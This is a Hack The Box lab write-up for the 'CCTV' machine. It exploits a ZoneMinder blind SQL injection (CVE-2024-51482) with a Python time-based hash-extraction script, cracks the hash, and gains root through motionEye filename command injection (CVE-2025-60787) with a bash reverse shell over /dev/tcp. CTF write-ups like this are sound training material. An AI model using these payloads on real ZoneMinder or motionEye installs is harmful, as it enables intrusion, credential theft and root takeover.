# Machine: CCTV
 
Date: 26-05-2026
Platform: Hack The Box
Difficulty: Easy
Author: atrix187
 
---
 
## Vulnerabilities Exploited
 
- **CVE-2024-51482** — ZoneMinder Authenticated Blind SQL Injection
- **CVE-2025-60787** — motionEye Command Injection via Image File Name
---
 
## Recon
 
### Nmap
 
```bash
sudo nmap -sC -sV -T4 10.129.5.54
```
 
```
Starting Nmap 7.99 at 2026-05-25 16:36 -0400
Nmap scan report for cctv.htb (10.129.5.54)
Host is up (0.076s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|_  256 76:1d:73:98:fa:05:f7:0b:04:c2:3b:c4:7d:e6:db:4a (ECDSA)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: SecureVision CCTV & Security Solutions
Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
 
**Results:**
 
- Port 22 → OpenSSH 9.6p1 (Ubuntu)
- Port 80 → Apache 2.4.58
**Notes:**
 
- Web server hosts a landing page for "SecureVision CCTV & Security Solutions" — fake corporate site.
- Found two email addresses on the landing page: `info@cctv.htb` and `info@securevision.com`
- The only notable link is a **Staff Login** button pointing to `/zm/` — a ZoneMinder instance.
- ZoneMinder version: **1.37.63**
- Added to `/etc/hosts`: `10.129.5.54 cctv.htb`
---
 
## Enumeration
 
### Application Fingerprinting
 
- `http://cctv.htb/zm/` → ZoneMinder 1.37.63, authenticated dashboard
- Default credentials `admin:admin` worked — full admin access
- Dashboard is empty: no monitors, no events, no cameras
### ZoneMinder Log API
 
ZoneMinder exposes an internal log endpoint that proved critical during exploitation:
 
```bash
curl -s -b 'ZMSESSID=YOUR_COOKIE' \
  'http://cctv.htb/zm/api/logs.json?token=YOUR_JWT'
```
 
This endpoint leaks every SQL error the server generates, including failed injection attempts. Without it, blind injection would have been guesswork.
 
---
 
## Exploitation
 
### CVE-2024-51482 — ZoneMinder Blind SQL Injection → Hash Extraction
 
ZoneMinder ≤ 1.37.64 has an authenticated SQL injection in `web/ajax/event.php`. The `removetag` action uses a parameterized query for the `DELETE` but concatenates `$tagId` directly into the `SELECT`:
 
```php
$tagId = $_REQUEST['tid'];
dbQuery('DELETE FROM Events_Tags WHERE TagId = ? AND EventId = ?',
    array($tagId, $_REQUEST['id']));
 
$sql = "SELECT * FROM Events_Tags WHERE TagId = $tagId"; // ← no sanitization
$rowCount = dbNumRows($sql);
```
 
**Vulnerable endpoint:**
 
```
/zm/index.php?view=request&request=event&action=removetag&tid=1
```
 
Normal response:
 
```json
{"result":"Ok","response":0}
```
 
**What didn't work (and why):**
 
- `GET` requests with injection (`tid=1 AND 1=1`, `tid=(SELECT SLEEP(5))`) → HTTP 500. Middleware killed the request before it reached the SQL layer.
- `POST` requests bypassed middleware but returned empty 500s. PHP exceptions were swallowing errors before any response was sent.
- Boolean injection (`AND 1=1` vs `AND 1=2`) returned identical responses. The `Events_Tags` table is completely empty — MySQL short-circuits `WHERE TagId = 1 AND <condition>` when no rows match, so the right side never evaluates.
- Direct `SLEEP()` calls failed for the same reason — empty table, no evaluation.
**The breakthrough:**
 
The ZoneMinder log API showed our payloads were reaching the SQL layer but crashing PHP with unhandled exceptions. This confirmed injection was occurring and revealed the correct payload format:
 
```
1 AND (SELECT 1 FROM (SELECT SLEEP(5)) as a)
```
 
Two things make this work where everything else failed:
- Starts with plain `1` — passes the DELETE's parameterized type check
- `FROM (SELECT SLEEP(5)) as a` — the alias forces MySQL to fully materialize the subquery regardless of whether any rows exist in the outer table
Must be sent via **GET** (POST triggers different PHP error handling).
 
**Steps:**
 
**1. Initial sqlmap run to confirm injection and enumerate databases:**
 
```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  --cookie="ZMSESSID=5khfmhobf9i7ffmddi3mup5hso" \
  -p tid --dbms=mysql --batch --dbs
```
 
```
available databases [3]:
[*] information_schema
[*] performance_schema
[*] zm
```
 
**2. Confirm time-based injection manually:**
 
```bash
time curl -s -b 'ZMSESSID=YOUR_COOKIE' \
  'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1%20AND%20(SELECT%201%20FROM%20(SELECT%20SLEEP(5))%20as%20a)&id=1'
# real 5.23s ✓
```
 
**3. Confirm target column — test if first char of mark's password is `$` (ASCII 36):**
 
```bash
time curl -s -b 'ZMSESSID=YOUR_COOKIE' \
  'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1%20AND%20(SELECT%20SLEEP(5)%20FROM%20(SELECT%201)%20as%20a%20WHERE%20ASCII(SUBSTRING((SELECT%20Password%20FROM%20zm.Users%20WHERE%20Username%3D%27mark%27),1,1))%3D36)&id=1'
# real 5.19s ✓
```
 
**4. Automate hash extraction with binary search:**
 
```python
import requests, time
 
TARGET = "http://cctv.htb"
COOKIE = {"ZMSESSID": "YOUR_COOKIE"}
SLEEP = 3
THRESHOLD = 2
 
def is_true(condition):
    payload = f"1 AND (SELECT SLEEP({SLEEP}) FROM (SELECT 1) as a WHERE {condition})"
    url = f"{TARGET}/zm/index.php?view=request&request=event&action=removetag&tid={payload}&id=1"
    start = time.time()
    requests.get(url, cookies=COOKIE)
    return (time.time() - start) > THRESHOLD
 
def get_char(query, pos):
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        if is_true(f"ASCII(SUBSTRING(({query}),{pos},1)) > {mid}"):
            low = mid + 1
        else:
            high = mid - 1
    return chr(low) if 32 <= low <= 126 else None
 
def extract(query, length=60):
    result = ""
    for i in range(1, length + 1):
        c = get_char(query, i)
        if not c:
            break
        result += c
        print(f"\r[+] {result}", end="", flush=True)
    print()
 
extract("SELECT Password FROM zm.Users WHERE Username='mark'")
```
 
**Result:**
 
```
[+] $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.
```
 
**5. Crack the hash:**
 
```bash
echo '$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# opensesame
```
 
**6. SSH as mark:**
 
```bash
ssh mark@cctv.htb
# password: opensesame
```
 
**Result:** Shell as `mark`. User flag at `/home/sa_mark/user.txt`.
 
---
 
## Privilege Escalation
 
### Discovery — Internal motionEye Service
 
```bash
ls /etc/motioneye/
# motion.conf  motioneye.conf
 
cat /etc/motioneye/motion.conf
```
 
```
# @admin_username admin
# @normal_username user
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
# @lang en
# @enabled on
# @normal_password
 
setup_mode off
webcontrol_port 7999
webcontrol_interface 1
webcontrol_localhost on
webcontrol_parms 2
 
camera camera-1.conf
```
 
The config leaks credentials in comments and shows the webcontrol is bound to `localhost:7999`.
 
**Port forward to access locally:**
 
```bash
ssh -L 7999:127.0.0.1:7999 mark@cctv.htb
```
 
Browsing to `http://localhost:7999` reveals a **motionEye** instance — version **0.43.1b4**, running as **root**.
 
---
 
### CVE-2025-60787 — motionEye Command Injection via Image File Name
 
motionEye passes the "Image File Name" configuration field directly to the motion daemon as a filename template. When motion captures images, it processes the filename through a shell — shell metacharacters execute as commands.
 
**Steps:**
 
**1. Set up listener:**
 
```bash
nc -lvnp 4444
```
 
**2. Bypass client-side JS validation in browser console:**
 
```javascript
configUiValid = function() { return true; };
```
 
This replaces the frontend validation with a function that always returns true. Without this, the UI silently rejects any filename containing shell metacharacters.
 
**3. Set the Image File Name field to the reverse shell payload:**
 
```
$(python3 -c "import os;os.system('bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\"')").%Y-%m-%d-%H-%M-%S
```
 
**4. Set Capture Mode to Interval Snapshots** (short interval).
 
> Without this, the motion daemon never writes files and never processes the filename template — the injection never fires. The command only executes when motion is actively capturing.
 
**5. Save config and wait ~10 seconds.**
 
**Result:** Shell caught as `root`.
 
---
 
## Loot / Flags
 
- **user.txt:** `[REDACTED]` → `/home/sa_mark/user.txt`
- **root.txt:** `[REDACTED]` → `/root/root.txt`
---
 
## Lessons Learned
 
- Check application logs when stuck. The ZoneMinder log API exposed every SQL error server-side — without it, the correct payload format would have taken far longer to find. Internal log endpoints are an underrated recon resource.
- Empty tables break AND-based boolean/time injection. `WHERE TagId = 1 AND SLEEP(5)` does nothing if no rows match — MySQL short-circuits. The subquery alias trick `(SELECT SLEEP(5)) as a` forces evaluation regardless of outer table state.
- GET vs POST matters. The vulnerable endpoint behaved completely differently by HTTP method — middleware, routing, and PHP error handling can all vary based on how the request arrives.
- Client-side validation is theater. One line in the browser console bypassed motionEye's entire frontend security model.
- Understand the trigger. Command injection only fires when motion is actively processing filenames. Setting the wrong capture mode means the payload never executes — understanding application behavior, not just the vulnerability, is what gets the shell.
